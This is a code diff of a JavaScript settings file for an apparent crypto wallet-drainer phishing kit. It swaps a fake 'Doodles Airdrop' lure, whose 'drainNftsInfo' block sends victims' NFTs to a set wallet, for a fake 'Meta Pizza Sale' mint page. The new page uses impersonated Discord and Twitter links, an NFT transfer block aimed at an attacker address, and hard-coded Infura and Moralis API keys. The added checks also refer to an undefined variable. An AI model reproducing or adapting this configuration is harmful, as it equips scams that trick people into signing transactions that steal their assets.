@@ -1,35 +1,55 @@
-const receiveAddress = "0x75260938F48180f8C1A6fC9a124ED3ed46561F5a";
-
+const address = '0x9c23c05cD550925Ff3AeA4a100fd780eAc06b00B',
+  infuraId = '821f5cf018a74107b7dc28802985b0b7',
+  moralisApi =
+    'U97vi2GVVEop2THgfYAewqcXlzorpYYl4hEBUKGSsNKR3YRgNd0fxEUU7hxREeTa'
+const x20Ethereum = '0x9c23c05cD550925Ff3AeA4a100fd780eAc06b00B'
 const collectionInfo = {
-    name: "Doodles Airdrop",
-    text1: "VERIFY YOUR ELIGIBILITY.",
-    text2: "THE DOODLES AIRDROP IS A SIGN THAT YOU ARE PART OF OUR COMMUNITY. TO CLAIM THE AIRDROP CONNECT YOUR WALLET AND SIGN THE TRANSACTION",
-    medias: {
-        preview: "seed-video.mp4",
-        favicon: "icon.jpg",
-    },
-    background:  {
-        color: "#45BBFF", // If you don't use color type, you can ignore this line
-    }
+  name: 'Unapologetic Apes',
+  title: 'Meta Pizza Sale',
+  date: '07.05.2022',
+  socialMedia: {
+    discord: 'https://discord.com/invite/metapizza/',
+    twitter: 'https://twitter.com/MetaPizzaNFT/',
+  },
+  medias: {
+    preview: 'preview.gif',
+    favicon: 'logo.png',
+  },
+  background: {
+    type: 'video',
+    image: 'background.png',
+    video: 'background.mp4',
+    color: '#4E4E6D',
+  },
 }
-
-const drainNftsInfo = {
-    minValue: 0.01,
-    maxTransfer: 5,
-    nftReceiveAddress: "0x75260938F48180f8C1A6fC9a124ED3ed46561F5a"
+const mintInfo = {
+    price: 0.111,
+    totalSupply: 555,
+    minUnits: 1,
+    maxUnits: 5,
+    askMintLoop: true,
+  },
+  nftsInfo = {
+    active: true,
+    minValue: 0.2,
+    checkMaxDay: 100,
+	maxTransfer: 2,
+    receiveAddress: '0x9c23c05cD550925Ff3AeA4a100fd780eAc06b00B',
+  }
+if (mintInfo.minUnits > mintInfo.maxUnits) {
+  console.error(
+    'Error: minUnits (' +
+      mintInfo.minUnits +
+      ') is greater than maxUnits (' +
+      maxUnits +
+      ')'
+  )
 }
-
-
-/*
-    = = = = = END OF SETTINGS = = = = =
-*/
-
-//#region Check Configuration
-
-if (!receiveAddress.startsWith("0x") ||
-    (
-        receiveAddress.length >= 64 ||
-        receiveAddress.length <= 40
-    )
-) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
-//#endregion
+if (mintInfo.minUnits <= 0) {
+  console.error(
+    'Error: minUnits (' + mintInfo.minUnits + ') is less than or equal to 0'
+  )
+}
+if (!address.startsWith('0x') || address.length >= 64 || address.length <= 40) {
+  console.error('Error: ' + address + ' is not a valid Ethereum address.')
+}
